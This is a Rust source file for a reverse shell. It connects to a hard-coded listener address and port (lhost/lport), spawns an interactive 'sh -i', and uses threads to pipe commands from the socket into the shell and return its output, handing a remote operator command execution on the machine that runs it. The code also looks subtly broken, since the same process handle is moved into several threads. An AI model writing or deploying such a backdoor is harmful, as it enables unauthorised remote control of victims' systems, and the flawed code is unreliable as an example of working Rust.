use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::thread;

fn main() -> std::io::Result<()> {
    let lhost = "127.0.0.1";
    let lport = "4444";
    match TcpStream::connect(format!("{}:{}", lhost, lport)) {
        Ok(stream) => {
            let mut subprocess = Command::new("sh")
                .arg("-i")
                .stdin(Stdio::piped())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()
                .expect("Failed to spawn shell");
            let mut socket_read_stream = stream.try_clone().expect("Failed to clone stream");
            let mut socket_stdout_write_stream =
                stream.try_clone().expect("Failed to clone stream");
            let mut socket_stderr_write_stream =
                stream.try_clone().expect("Failed to clone stream");

            let read_thread = thread::spawn(move || {
                let mut stdin = subprocess.stdin.take().expect("Failed to open stdin");
                loop {
                    let mut buf = [0; 1024];
                    socket_read_stream.read(&mut buf).unwrap();
                    let mut command = String::from_utf8(buf.to_vec()).unwrap();
                    while let Some('\x00') = command.chars().last() {
                        command.pop();
                    }
                    if command == "" {
                        break;
                    }
                    println!("Received: {:?}", command);
                    stdin.write_all(command.as_bytes()).unwrap();
                }
            });
            let stdout_write_thread = thread::spawn(move || loop {
                let stdout = subprocess.stdout.take().expect("Failed to open stdout");
                for byte in stdout.bytes() {
                    let output = byte.unwrap();
                    socket_stdout_write_stream.write(&[output]).unwrap();
                    socket_stdout_write_stream.flush().unwrap();
                }

            });
            let stderr_write_thread = thread::spawn(move || loop {
                let stdout = subprocess.stderr.take().expect("Failed to open stderr");
                for byte in stdout.bytes() {
                    let output = byte.unwrap();
                    socket_stderr_write_stream.write(&[output]).unwrap();
                    socket_stderr_write_stream.flush().unwrap();
                }
            });
            read_thread.join().unwrap();
            stdout_write_thread.join().unwrap();
            stderr_write_thread.join().unwrap();
        }
        Err(e) => {
            println!("Failed to connect: {}", e);
        }
    }
    Ok(())
}
